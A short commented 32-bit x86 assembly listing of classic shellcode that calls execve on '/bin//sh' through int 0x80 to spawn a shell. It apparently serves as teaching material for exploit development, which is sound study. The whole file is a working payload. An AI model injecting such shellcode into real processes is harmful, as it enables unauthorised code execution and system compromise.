BITS 32

; execve(const char *pathname, char *const argv [], char *const envp[])
  xor eax, eax      ; zero out eax
  push eax          ; push 4-bytes null
  push 0x68732f2f   ; push "//sh" to the stack
  push 0x6e69622f   ; push "/bin" to the stack
  mov ebx, esp      ; (#1) address of "/bin//sh"
  push eax          ; push 4-bytes null
  mov edx, esp      ; (#3) empty array for envp
  push ebx          ; push ptr to /bin//sh string to stack
  mov ecx, esp      ; (#2) argv array, argv[0]=ebx
  mov al, 11        ; syscall #11 execve
  int 0x80          ; do it
